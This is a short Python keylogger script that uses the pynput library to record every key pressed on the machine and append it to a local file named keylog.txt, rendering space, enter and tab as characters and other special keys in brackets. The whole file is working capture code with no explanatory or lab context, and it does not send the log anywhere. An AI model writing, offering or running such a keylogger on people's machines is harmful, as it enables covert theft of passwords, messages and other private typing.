from pynput import keyboard
import os
import time

file = open('keylog.txt', 'a')
file.write('Start keylogging\n')
file.close()

def format_special_key(key):
    special_keys = {
        keyboard.Key.space: ' ',
        keyboard.Key.enter: '\n',
        keyboard.Key.tab: '\t',
    }
    
    return special_keys.get(key, f'[{str(key)}]')

def on_press(key):
    file = open('keylog.txt', 'a')
    try:
        key = key.char
        #print(f'alphanumeric key {key} pressed')
        file.write(f"{key}")
        
    except AttributeError:
        #print(f'special key {key} pressed')
        key = format_special_key(key)
        key = str(key).replace('Key.', '')
        file.write(f"{str(key)}")
    file.close()
        
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    
   
